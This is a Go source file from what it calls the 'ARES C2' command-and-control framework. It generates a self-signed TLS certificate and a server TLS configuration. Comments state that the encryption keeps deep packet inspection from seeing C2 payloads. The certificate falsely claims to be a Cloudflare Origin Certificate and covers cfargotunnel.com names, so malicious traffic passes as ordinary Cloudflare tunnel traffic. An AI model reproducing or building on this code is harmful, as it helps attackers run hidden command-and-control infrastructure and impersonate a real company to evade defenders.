/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES C2 — TLS Certificate Generator + HTTPS Server
 *
 *  Auto-generates self-signed TLS certificate at startup.
 *  All C2 traffic encrypted — DPI cannot inspect payload.
 * ═══════════════════════════════════════════════════════════════
 */

package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"math/big"
	"os"
	"path/filepath"
	"time"
	"log"
)

// GenerateSelfSignedCert creates a self-signed TLS cert + key
// Returns paths to cert.pem and key.pem files
func GenerateSelfSignedCert(dataDir string) (certPath, keyPath string, err error) {
	certPath = filepath.Join(dataDir, "cert.pem")
	keyPath = filepath.Join(dataDir, "key.pem")

	// Check if cert already exists
	if _, e := os.Stat(certPath); e == nil {
		if _, e2 := os.Stat(keyPath); e2 == nil {
			log.Println("[TLS] Using existing certificate")
			return certPath, keyPath, nil
		}
	}

	log.Println("[TLS] Generating self-signed certificate...")

	// Generate ECDSA P-256 key (smaller + faster than RSA)
	privateKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return "", "", err
	}

	// Certificate template
	serialNumber, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			// Cloudflare Origin Certificate — matches tunnel setup
			Organization:  []string{"Cloudflare, Inc."},
			CommonName:    "Cloudflare Origin Certificate",
			Country:       []string{"US"},
			Province:      []string{"California"},
			Locality:      []string{"San Francisco"},
		},
		NotBefore:             time.Now().Add(-24 * time.Hour),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // 1 year
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{"localhost", "*.cfargotunnel.com"},
	}

	// Self-sign
	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template,
		&privateKey.PublicKey, privateKey)
	if err != nil {
		return "", "", err
	}

	// Write cert PEM
	certFile, err := os.Create(certPath)
	if err != nil {
		return "", "", err
	}
	pem.Encode(certFile, &pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	certFile.Close()

	// Write key PEM
	keyFile, err := os.Create(keyPath)
	if err != nil {
		return "", "", err
	}
	keyBytes, err := x509.MarshalECPrivateKey(privateKey)
	if err != nil {
		return "", "", err
	}
	pem.Encode(keyFile, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyBytes})
	keyFile.Close()

	log.Printf("[TLS] Certificate generated: %s", certPath)
	return certPath, keyPath, nil
}

// CreateTLSConfig creates a TLS config for the HTTPS server
func CreateTLSConfig(certPath, keyPath string) (*tls.Config, error) {
	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		return nil, err
	}

	return &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
		},
	}, nil
}
